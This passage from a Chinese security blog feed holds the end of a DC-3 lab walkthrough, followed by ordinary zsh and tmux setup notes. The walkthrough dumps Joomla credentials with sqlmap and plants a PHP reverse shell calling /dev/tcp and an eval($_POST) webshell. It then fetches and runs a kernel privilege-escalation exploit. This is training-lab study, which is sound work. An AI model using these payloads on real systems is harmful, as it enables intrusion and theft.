title="metasploit"></a>metasploit</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br>search Joomla<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405222014737.png" alt="image-20240522201407606"></p><blockquote><p>通过metasploit搜索到的漏洞也不少，可以进行简单的尝试</p></blockquote><p>由于之前通过nmap扫描扫到一个2017年的sql注入，这里刚好也有一个sql注入，我们就先试这个<code>exploit/unix/webapp/joomla_comfields_sqli_rce</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">show options<br><span class="hljs-built_in">set</span> RHOSTS 192.168.31.31<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405222017638.png" alt="image-20240522201722495"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exploit<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405222018947.png" alt="image-20240522201812853"></p><blockquote><p>总结：失败！</p></blockquote><h2 id="2-5-sqlmap注入测试"><a href="#2-5-sqlmap注入测试" class="headerlink" title="2.5 sqlmap注入测试"></a>2.5 sqlmap注入测试</h2><p>根据上一小节的<code>searchsploit</code>搜索得到的信息对其进行sqlmap注入测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.31.31/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405222106850.png" alt="image-20240522210633722"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.31.31/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405222113352.png" alt="image-20240522211353251"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.31.31/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb -T <span class="hljs-comment">#__users --colums -p list[fullordering]</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405222212736.png" alt="image-20240522221201615"></p><p>这里已经得到了用户的用户名和密码列，我们查看相应内容，观察是否存在相应的用户名和密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.31.31/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb -T <span class="hljs-comment">#__users -C name,username,password --dump -p list[fullordering]</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405230953541.png" alt="image-20240523095312405"></p><p>确实得到了乡音的用户名和密码，但是密码经过了hash加密，我们可以尝试通过hash值保存到user_admin_pw.hash中，然后再进行进一步的碰撞破解。、</p><blockquote><p>name: admin</p><p>username: admin</p><p>password: $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">john user_admin_pw.hash<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231004094.png" alt="image-20240523100426047"></p><p>成功爆破出相应的密码，所以我们此时应该是得到了相应的用户名和密码；</p><blockquote><p>username: admin</p><p>password: snoopy</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231006774.png" alt="image-20240523100601555"></p><p>好的，成功登录后台管理系统！</p><h2 id="2-6-getshell"><a href="#2-6-getshell" class="headerlink" title="2.6 getshell"></a>2.6 getshell</h2><p>在后台管理系统中找到了php文件处，有了php文件，可以考虑各种拿shell的方法，包括但不限于一句话木马</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231032811.png" alt="image-20240523103251665"></p><p>两个模板中都有php文件，但经过尝试只有下方的模板文件才能够起到效果</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231033588.png" alt="image-20240523103355523"></p><p>只有<code>index.php</code>才是可访问的文件，也是我们正常情况下提前考虑的文件</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231034911.png" alt="image-20240523103441861"></p><p>我们通过在<code>index.php</code>中写入我们的木马进行getshell，当然可以选择一句话木马，然后通过中国菜刀进行了连接等等。各种方式，似乎并没有过滤；</p><p>方法一：通过<code>proc_open</code>反弹shell</p><p>输入我们通过proc_open反弹shell的php代码， 点击左上角的保存，然后打开攻击机的监听；再访问相应的php网页，即可获得相应的shell</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231041370.png" alt="image-20240523104131102"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 当系统没有禁用proc_open的时候，我们是可以借助proc_open轻松反弹这样的一个shell的。</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;192.168.31.221&#x27;</span>;  <span class="hljs-comment">// 攻击者的IP地址</span><br><span class="hljs-variable">$port</span> = <span class="hljs-number">5555</span>;          <span class="hljs-comment">// 攻击者的端口号</span><br><br><span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-number">0</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>),   <span class="hljs-comment">// stdin 是一个管道，子进程从中读取数据</span><br>    <span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>),   <span class="hljs-comment">// stdout 是一个管道，子进程向其中写入数据</span><br>    <span class="hljs-number">2</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)    <span class="hljs-comment">// stderr 是一个管道，子进程向其中写入数据</span><br>);<br><br><span class="hljs-variable">$process</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/<span class="hljs-subst">$ip</span>/<span class="hljs-subst">$port</span> 0&gt;&amp;1&#x27;&quot;</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$process</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>]);  <span class="hljs-comment">// 关闭stdin</span><br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]);  <span class="hljs-comment">// 关闭stdout</span><br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);  <span class="hljs-comment">// 关闭stderr</span><br><br>    <span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$process</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231042623.png" alt="image-20240523104247581"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231043124.png" alt="image-20240523104310882"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231028513.png" alt="image-20240523102841453"></p><p>方法二：通过一句话木马，蚁剑连接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231125022.png" alt="image-20240523112548768"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231126338.png" alt="image-20240523112618284"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231126271.png" alt="image-20240523112655211"></p><blockquote><p>结论：shell拿到了，但不是root权限，接下来就是提权</p></blockquote><h1 id="3-提权"><a href="#3-提权" class="headerlink" title="3. 提权"></a>3. 提权</h1><p><a href="https://www.cnblogs.com/sfsec/p/15163907.html">最详细Linux提权总结（建议收藏） - 随风kali - 博客园 (cnblogs.com)</a></p><h2 id="3-1-查看是否存在相关的提权命令"><a href="#3-1-查看是否存在相关的提权命令" class="headerlink" title="3.1 查看是否存在相关的提权命令"></a>3.1 查看是否存在相关的提权命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">compgen -c | grep -E -x <span class="hljs-string">&quot;nmap|vim|vi|nano|bash|less|more|cp|find|git|wget|cat|apt|zip|xxd|time|taskset|sed|pip|ed|tmux|scp|perl|awk|man|env|ftp&quot;</span><br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231717684.png" alt="image-20240523171744596"></p><p>命令是有的，但是并没有相关的命令存在suid权限，所以相应的命令并不可以用来做提权</p><h2 id="3-2-内核漏洞提权"><a href="#3-2-内核漏洞提权" class="headerlink" title="3.2 内核漏洞提权"></a>3.2 内核漏洞提权</h2><p>通过以下指令查询使用的操作系统信息和内核相关信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">cat</span> /etc/issue<br><span class="hljs-built_in">cat</span> /etc/*-release<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231543535.png" alt="image-20240523154340480"></p><p>可以知道相关的操作系统版本和发行号等等</p><blockquote><p>Ubuntu 16.04 LTS</p><p>Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU</p></blockquote><p>通过<code>searchsploit</code>搜索得到以下的内核漏洞搜索结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit ubuntu 16.04<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231603429.png" alt="image-20240523160332242"></p><blockquote><p>搜索出来的漏洞不少，可以对其中的一些进行尝试；一般后缀为txt的漏洞利用都比较容易实现，现场时以下符合条件的漏洞吧。</p></blockquote><p>最后成功的漏洞是<code>39772.txt</code>，通过下方命令将漏洞文本复制到当前目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -m 39772.txt<br><span class="hljs-built_in">cat</span> 39772.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231645292.png" alt="image-20240523164515075"></p><blockquote><p>可知器利用方式，通过下载<code>https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</code>链接的压缩包进行利用，然后进入相应目录，执行<code>./compile.sh</code>和<code>./doubleput</code></p></blockquote><p>来到我们getshell的机器中利用<code>wget</code>下载链接的压缩包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231633791.png" alt="image-20240523163323614"></p><p>通过命令解压文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">unzip 39772.zip<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231633056.png" alt="image-20240523163342910"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> 39772<br><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231633852.png" alt="image-20240523163355804"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -xvf crasher.tar<br>tar -xvf exploit.tar<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231635359.png" alt="image-20240523163517965"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ebpf_mapfd_doubleput_exploit<br>./compile.sh<br>./doubleput<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231700112.png"></p><p>通过指令启动一个交互式界面，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231702174.png" alt="image-20240523170222381"></p><blockquote><p>最后，我们确实得到了该机子的root权限，最后的目的就是找到flag即可；</p></blockquote><p>通过以下命令寻找flag文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231708704.png" alt="q"></p><p>最终也是成功的找到了flag并执行，over！</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405231709722.png" alt="image-20240523170912662"></p><h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h1><ol><li>拿站后进行提权的方式多样，其中包括<ul><li>可执行的二进制文件具有suid权限，特别是相关命令的提权</li><li>内核漏洞脏牛提权</li><li>密码复用提权</li><li>明文root密码提权</li><li>第三方服务提权</li></ul></li><li>sqlmap的使用方法多样，通过多种使用方法可以实现不同的效果</li><li>拿到网站后台管理系统后，可以寻找发布网页或者网页本身内容的php文件，通过插入一句话木马或者反弹shell实现getshell</li></ol>]]></content>
    
    
    <categories>
      
      <category>渗透学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web攻防</tag>
      
      <tag>打靶日记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zsh基本配置</title>
    <link href="/2024/05/18/zsh%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/"/>
    <url>/2024/05/18/zsh%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="1-下载安装zsh"><a href="#1-下载安装zsh" class="headerlink" title="1. 下载安装zsh"></a>1. 下载安装zsh</h1><blockquote><p>sudo apt install zsh</p></blockquote><p>设置终端默认启动zsh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">chsh -s /bin/zsh<br>chsh -s `<span class="hljs-built_in">which</span> zsh`<br><br><span class="hljs-comment">#如果要切换回去bash：</span><br>chsh -s /bin/bash<br></code></pre></td></tr></table></figure><h1 id="2-安装oh-my-zsh"><a href="#2-安装oh-my-zsh" class="headerlink" title="2. 安装oh-my-zsh"></a>2. 安装oh-my-zsh</h1><blockquote><p>git clone <a href="https://github.com/robbyrussell/oh-my-zsh.git">https://github.com/robbyrussell/oh-my-zsh.git</a> </p><p>cd oh-my-zsh</p><p>cd tools</p><p>.&#x2F;install.sh</p></blockquote><h1 id="3-配置主题"><a href="#3-配置主题" class="headerlink" title="3. 配置主题"></a>3. 配置主题</h1><p>oh-my-zsh 集成了大量的主题, 位于<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Themes">Themes · ohmyzsh&#x2F;ohmyzsh Wiki (github.com)</a></p><p>配置主题, 可以通过修改<code>~/.zshrc</code>中的环境变量<code>ZSH_THEME</code>实现更换主题</p><blockquote><p>ZSH_THEME&#x3D;”bira”</p></blockquote><p>如果觉得主题太多，可以选择使用随机模式, 不过这就比较刺激了。</p><blockquote><p>SH_THEME&#x3D;”random”</p></blockquote><h1 id="4-on-my-zsh自动补全插件"><a href="#4-on-my-zsh自动补全插件" class="headerlink" title="4. on-my-zsh自动补全插件"></a>4. on-my-zsh自动补全插件</h1><p>将相应的插件<code>git</code>克隆<code>zsh-autosuggestions</code>仓库到你的本地<code>.oh-my-zsh/custom/plugins</code>目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions<br></code></pre></td></tr></table></figure><p>然后修改本地的<code>~/.zshrc</code>文件中的<code>plugins</code>选项，加入<code>zsh-autosuggestions</code>，如图所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim ~/.zshrc<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406011850505.png" alt="image-20240601185003427"></p><p>然后在运行以下命令，重新加载当前用户的 <code>~/.zshrc</code> 文件即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> ~/.zshrc<br></code></pre></td></tr></table></figure><h1 id="5-on-my-zsh高亮插件"><a href="#5-on-my-zsh高亮插件" class="headerlink" title="5. on-my-zsh高亮插件"></a>5. on-my-zsh高亮插件</h1><p>将相应的插件<code>git</code>克隆<code>zsh-syntax-highlighting</code>仓库到你的本地<code>.oh-my-zsh/custom/plugins</code>目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="hljs-variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting<br></code></pre></td></tr></table></figure><p>然后修改本地的<code>~/.zshrc</code>文件中的<code>plugins</code>选项，加入<code>zsh-syntax-highlighting</code>，如图所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim ~/.zshrc<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406011850135.png" alt="image-20240601185043104"></p><p>然后在运行以下命令，重新加载当前用户的 <code>~/.zshrc</code> 文件即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> ~/.zshrc<br></code></pre></td></tr></table></figure><h1 id="6-zsh导致的问题"><a href="#6-zsh导致的问题" class="headerlink" title="6.zsh导致的问题"></a>6.zsh导致的问题</h1><h2 id="文件名解析错误"><a href="#文件名解析错误" class="headerlink" title="文件名解析错误"></a>文件名解析错误</h2><h3 id="zsh-no-matches-found-list-fullordering"><a href="#zsh-no-matches-found-list-fullordering" class="headerlink" title="zsh: no matches found: list[fullordering]"></a>zsh: no matches found: list[fullordering]</h3><p>在使用 Zsh（Z shell）时，如果你看到错误消息 <code>zsh: no matches found: list[fullordering]</code>，这通常是由于 Zsh 的文件名模式匹配（globbing）功能导致的。当你在命令行中使用方括号（<code>[]</code>）时，Zsh 会尝试将其解释为文件名模式匹配，而不是你可能预期的普通字符串或数组访问。</p><p>可以通过在<code>~/.zshrc</code>文件中添加以下内容解决</p><blockquote><p>set noglob#禁用文件名模式匹配</p></blockquote><p>除了上述的解决方法还有</p><p>通过转义中括号的方法，还没有尝试可行性</p><blockquote><p>执行命令时，将list[fullordering]，写成list\[fullordering\]</p></blockquote><p>参考链接：<a href="https://yuyucong.github.io/linux/2018/02/08/shell/">Tmux &#x2F; zsh &#x2F; oh-my-zsh教程 - 风车车的博客 | Windmill Blog (yuyucong.github.io)</a></p>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
      <tag>工具配置</tag>
      
      <tag>美化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tmux基本使用</title>
    <link href="/2024/05/18/tmux%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <url>/2024/05/18/tmux%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="1-tmux是什么"><a href="#1-tmux是什么" class="headerlink" title="1. tmux是什么"></a>1. tmux是什么</h1><p>命令行的典型使用方式是，打开一个终端窗口（terminal window，以下简称”窗口”），在里面输入命令。<strong>用户与计算机的这种临时的交互，称为一次”会话”（session）</strong> </p><p><strong>Tmux 就是会话与窗口的”解绑”工具，将它们彻底分离。</strong>在我的理解看来，就是能在一个终端开启多个会话，简洁美观，这也是我想追求的效果；</p><p>tmux采用C&#x2F;S模型构建，输入tmux命令就相当于开启了一个服务器，此时默认将新建一个会话，然后会话中默认新建一个窗口，窗口中默认新建一个面板。会话、窗口、面板之间的联系如下</p><p>一个tmux <code>session</code>（会话）可以包含多个<code>window</code>（窗口），窗口默认充满会话界面，因此这些窗口中可以运行相关性不大的任务。</p><p>一个<code>window</code>又可以包含多个<code>pane</code>（面板），窗口下的面板，都处于同一界面下，这些面板适合运行相关性高的任务，以便同时观察到它们的运行情况。</p><h1 id="2-tmux下载安装"><a href="#2-tmux下载安装" class="headerlink" title="2. tmux下载安装"></a>2. tmux下载安装</h1><p>使用下方命令直接下载tmux即可：</p><blockquote><p>sudo apt install tmux</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405182030590.png" alt="image-20240518203031518"></p><h1 id="3-基本使用方法"><a href="#3-基本使用方法" class="headerlink" title="3. 基本使用方法"></a>3. 基本使用方法</h1><h2 id="3-1基本启动"><a href="#3-1基本启动" class="headerlink" title="3.1基本启动"></a>3.1基本启动</h2><p>直接输入<code>tmux</code>即可进入tmux</p><blockquote><p>tmux#创建一个无名会话</p><p>tmux new -s demo#创建一个名为demo的会话</p></blockquote><h2 id="3-2tmux快捷指令"><a href="#3-2tmux快捷指令" class="headerlink" title="3.2tmux快捷指令"></a>3.2tmux快捷指令</h2><p>关于快捷指令，首先要认识到的是：tmux的所有指令，都包含同一个前缀，默认为<code>Ctrl+b</code>，输入完前缀过后，控制台激活，命令按键才能生效。前面tmux会话相关的操作中，我们共用到了两个快捷键<code>Ctrl+b</code> + <code>d</code>、<code>Ctrl+b</code> + <code>s</code>，但这仅仅是冰山一角，欲窥tmux庞大的快捷键体系，请看下表。</p><p>表一：系统指令。</p><table><thead><tr><th align="center">前缀</th><th align="center">指令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>?</code></td><td align="center">显示快捷键帮助文档</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>d</code></td><td align="center">断开当前会话</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>D</code></td><td align="center">选择要断开的会话</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>Ctrl+z</code></td><td align="center">挂起当前会话</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>r</code></td><td align="center">强制重载当前会话</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>s</code></td><td align="center">显示会话列表用于选择并切换</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>:</code></td><td align="center">进入命令行模式，此时可直接输入<code>ls</code>等命令</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>[</code></td><td align="center">进入复制模式，按<code>q</code>退出</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>]</code></td><td align="center">粘贴复制模式中复制的文本</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>~</code></td><td align="center">列出提示信息缓存</td></tr></tbody></table><p>表二：窗口（window）指令。</p><table><thead><tr><th align="center">前缀</th><th align="center">指令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>c</code></td><td align="center">新建窗口</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>&amp;</code></td><td align="center">关闭当前窗口（关闭前需输入<code>y</code> or <code>n</code>确认）</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>0~9</code></td><td align="center">切换到指定窗口</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>p</code></td><td align="center">切换到上一窗口</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>n</code></td><td align="center">切换到下一窗口</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>w</code></td><td align="center">打开窗口列表，用于且切换窗口</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>,</code></td><td align="center">重命名当前窗口</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>.</code></td><td align="center">修改当前窗口编号（适用于窗口重新排序）</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>f</code></td><td align="center">快速定位到窗口（输入关键字匹配窗口名称）</td></tr></tbody></table><p>表三：面板（pane）指令。</p><table><thead><tr><th align="center">前缀</th><th align="center">指令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>&quot;</code></td><td align="center">当前面板上下一分为二，下侧新建面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>%</code></td><td align="center">当前面板左右一分为二，右侧新建面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>x</code></td><td align="center">关闭当前面板（关闭前需输入<code>y</code> or <code>n</code>确认）</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>z</code></td><td align="center">最大化当前面板，再重复一次按键后恢复正常（v1.8版本新增）</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>!</code></td><td align="center">将当前面板移动到新的窗口打开（原窗口中存在两个及以上面板有效）</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>;</code></td><td align="center">切换到最后一次使用的面板</td></tr><tr><td align="center"><code>Ctrl+b</code></td><td align="center"><code>q</code></td><td align="center">显示面板编号，在编号消失前输入对应的数字可切换到相应的面板</td></tr><tr><td 